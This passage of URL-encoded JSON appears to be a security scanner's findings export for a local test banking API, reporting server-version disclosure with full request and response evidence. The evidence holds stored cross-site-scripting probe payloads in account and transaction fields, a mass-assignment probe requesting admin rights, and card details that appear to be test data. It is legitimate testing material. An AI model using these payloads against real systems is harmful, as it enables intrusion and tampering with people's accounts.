ncontent-length%3A%201011%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%5B%7B%5C%22id%5C%22%3A1%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Everyday%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%223450.75%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A2%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Savings%20Account%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2218900.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000003%5C%22%2C%5C%22account_type%5C%22%3A%5C%22loan%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Home%20Loan%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%22-285000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%2C%7B%5C%22id%5C%22%3A51%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210000004%5C%22%2C%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Platinum%20Credit%20Card%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%2225000.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%2C%5C%22card_number%5C%22%3A%5C%224532015001345674%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2208%5C%5C%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22842%5C%22%2C%5C%22credit_limit%5C%22%3A%5C%2225000.00%5C%22%7D%2C%7B%5C%22id%5C%22%3A101%2C%5C%22bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22account_number%5C%22%3A%5C%2210593296%5C%22%2C%5C%22account_type%5C%22%3A%5C%22transaction%5C%22%2C%5C%22account_name%5C%22%3A%5C%22')%3Bdocument.body.dataset.aespa%3D'xss007'%3B%5C%5C%2F%5C%5C%2F%5C%22%2C%5C%22currency%5C%22%3A%5C%22AUD%5C%22%2C%5C%22balance%5C%22%3A%5C%220.00%5C%22%2C%5C%22is_active%5C%22%3Atrue%7D%5D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20precise%20Apache%20and%20PHP%20versions%20through%20the%20Server%20and%20X-Powered-By%20headers.%22%2C%22impact%22%3A%22The%20version%20information%20helps%20attackers%20identify%20applicable%20public%20vulnerabilities%20and%20tailor%20later%20probes.%22%2C%22likelihood%22%3A%22The%20headers%20are%20returned%20to%20unauthenticated%20clients%20on%20every%20observed%20API%20response%2C%20although%20no%20vulnerable-version%20exploit%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Suppress%20the%20X-Powered-By%20header%20and%20configure%20Apache%20to%20return%20a%20generic%20Server%20header.%20Keep%20both%20components%20patched.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22The%20unauthenticated%20GET%20response%20included%20Server%3A%20Apache%2F2.4.68%20(Unix)%20and%20X-Powered-By%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnPOST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22invalid-email%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22valid-enough-password%5C%22%2C%20%5C%22first_name%5C%22%3A%20%5C%22Integrity%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Probe%5C%22%2C%20%5C%22role%5C%22%3A%20%5C%22admin%5C%22%2C%20%5C%22is_admin%5C%22%3A%20true%2C%20%5C%22balance%5C%22%3A%20999999%2C%20%5C%22verified%5C%22%3A%20true%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20422%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A06%3A18%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20154%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22VALIDATION_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22Validation%20failed%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22email%5C%22%3A%5B%5C%22The%20email%20field%20must%20be%20a%20valid%20email%20address.%5C%22%5D%7D%7D%7D%22%2C%22request_evidence%22%3A%22POST%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Content-Type%5C%22%3A%20%5C%22application%2Fjson%5C%22%7D%5Cn%7B%5C%22email%5C%22%3A%20%5C%22invalid-email%5C%22%2C%20%5C%22password%5C%22%3A%20%5C%22valid-enough-password%5C%22%2C%20%5C%22first_name%5C%22%3A%20%5C%22Integrity%5C%22%2C%20%5C%22last_name%5C%22%3A%20%5C%22Probe%5C%22%2C%20%5C%22role%5C%22%3A%20%5C%22admin%5C%22%2C%20%5C%22is_admin%5C%22%3A%20true%2C%20%5C%22balance%5C%22%3A%20999999%2C%20%5C%22verified%5C%22%3A%20true%7D%22%2C%22response_evidence%22%3A%22Status%3A%20422%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A06%3A18%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20154%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22VALIDATION_ERROR%5C%22%2C%5C%22message%5C%22%3A%5C%22Validation%20failed%5C%22%2C%5C%22details%5C%22%3A%7B%5C%22email%5C%22%3A%5B%5C%22The%20email%20field%20must%20be%20a%20valid%20email%20address.%5C%22%5D%7D%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20exact%20Apache%20and%20PHP%20versions%20through%20response%20headers.%22%2C%22impact%22%3A%22The%20version%20information%20helps%20attackers%20identify%20potentially%20relevant%20component-specific%20vulnerabilities.%22%2C%22likelihood%22%3A%22The%20information%20is%20exposed%20to%20every%20remote%20requester%2C%20but%20no%20vulnerable%20component%20or%20direct%20exploit%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Remove%20or%20generalize%20the%20Server%20and%20X-Powered-By%20headers%20and%20keep%20Apache%20and%20PHP%20patched.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%3Frole%3Dadmin%26isAdmin%3Dtrue%22%2C%22evidence%22%3A%22The%20response%20disclosed%20server%3A%20Apache%2F2.4.68%20(Unix)%20and%20x-powered-by%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%3Frole%3Dadmin%26isAdmin%3Dtrue%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A59%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%3Frole%3Dadmin%26isAdmin%3Dtrue%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20405%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A13%3A59%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2087%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22METHOD_NOT_ALLOWED%5C%22%2C%5C%22message%5C%22%3A%5C%22Method%20not%20allowed.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20exact%20Apache%20and%20PHP%20versions%20through%20response%20headers.%22%2C%22impact%22%3A%22The%20version%20details%20help%20attackers%20identify%20potentially%20relevant%20component-specific%20vulnerabilities.%22%2C%22likelihood%22%3A%22The%20information%20is%20available%20in%20every%20observed%20response%2C%20but%20no%20exploitable%20component%20vulnerability%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Suppress%20or%20generalize%20the%20Server%20and%20X-Powered-By%20headers%20in%20production%20responses.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%22%2C%22evidence%22%3A%22The%20response%20headers%20disclose%20server%3A%20Apache%2F2.4.68%20(Unix)%20and%20x-powered-by%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A17%3A14%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20132%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A999%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D51%26page%3D999%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A17%3A14%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20132%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A999%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A0%2C%5C%22total_pages%5C%22%3A0%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22API%20responses%20disclose%20exact%20Apache%20and%20PHP%20versions%20through%20response%20headers.%22%2C%22impact%22%3A%22The%20version%20information%20can%20help%20attackers%20identify%20applicable%20component-specific%20vulnerabilities%2C%20but%20no%20exploitable%20component%20issue%20was%20demonstrated.%22%2C%22likelihood%22%3A%22The%20information%20is%20returned%20consistently%20to%20remote%20requests%20and%20requires%20no%20valid%20authentication.%22%2C%22recommendation%22%3A%22Suppress%20or%20generalize%20the%20Server%20header%20and%20disable%20PHP%20version%20exposure%20using%20expose_php%3DOff.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%22%2C%22evidence%22%3A%22The%20401%20response%20includes%20Server%3A%20Apache%2F2.4.68%20(Unix)%20and%20X-Powered-By%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A22%3A33%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Faccounts%3Fpage%3D1%26per_page%3D20%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20401%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A22%3A33%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%2076%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Afalse%2C%5C%22error%5C%22%3A%7B%5C%22code%5C%22%3A%5C%22UNAUTHORIZED%5C%22%2C%5C%22message%5C%22%3A%5C%22Invalid%20token.%5C%22%7D%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22skipped%22%2C%22validation_note%22%3A%22Not%20validated%3A%20severity%20'info'%20is%20below%20the%20configured%20threshold%20'low'.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Server%20and%20runtime%20versions%20are%20disclosed%22%2C%22description%22%3A%22HTTP%20response%20headers%20disclose%20the%20exact%20Apache%20and%20PHP%20versions.%22%2C%22impact%22%3A%22An%20attacker%20can%20use%20the%20version%20information%20to%20focus%20reconnaissance%20on%20applicable%20public%20vulnerabilities.%22%2C%22likelihood%22%3A%22The%20disclosure%20is%20directly%20observable%2C%20but%20no%20vulnerable%20component%20or%20related%20exploit%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Configure%20Apache%20and%20PHP%20to%20suppress%20detailed%20version%20information%20in%20response%20headers.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D2%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22The%20response%20includes%20Server%3A%20Apache%2F2.4.68%20(Unix)%20and%20X-Powered-By%3A%20PHP%2F8.4.25.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D2%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A28%3A13%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%201318%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%7B%5C%22id%5C%22%3A44%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.setAttribute('data-aespa-tx'%2C'B72D')%5C%5C%5C%22%3E%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-09-08%2013%3A19%3A47%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%2C%7B%5C%22id%5C%22%3A3%2C%5C%22from_account_id%5C%22%3A2%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000001%5C%22%2C%5C%22to_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%22200.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Weekend%20spending%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-02-01%2010%3A00%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22debit%5C%22%7D%2C%7B%5C%22id%5C%22%3A1%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%22500.00%5C%22%2C%5C%22description%5C%22%3A%5C%22Monthly%20savings%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22receipt_number%5C%22%3Anull%2C%5C%22original_currency%5C%22%3Anull%2C%5C%22original_amount%5C%22%3Anull%2C%5C%22exchange_rate%5C%22%3Anull%2C%5C%22created_at%5C%22%3A%5C%222026-01-05%2009%3A12%3A00%5C%22%2C%5C%22type%5C%22%3A%5C%22credit%5C%22%7D%5D%2C%5C%22pagination%5C%22%3A%7B%5C%22current_page%5C%22%3A1%2C%5C%22per_page%5C%22%3A15%2C%5C%22total%5C%22%3A3%2C%5C%22total_pages%5C%22%3A1%7D%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransactions%3Faccount_id%3D2%26page%3D1%26per_page%3D15%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A28%3A13%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnx-powered-by%3A%20PHP%2F8.4.25%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%201318%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22transactions%5C%22%3A%5B%7B%5C%22id%5C%22%3A44%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2210000002%5C%22%2C%5C%22to_account_id%5C%22%3A2%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22description%5C%22%3A%5C%22%3Cimg%20src%3Dx%20onerror%3D%5C%5C%5C%22document.body.setAttribute('data-aespa-tx'%2C'B72D')%5C%5C%5C%22%3E%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22own%5C%22%2C%5C%22address_book_id%5C%22%3Anull%2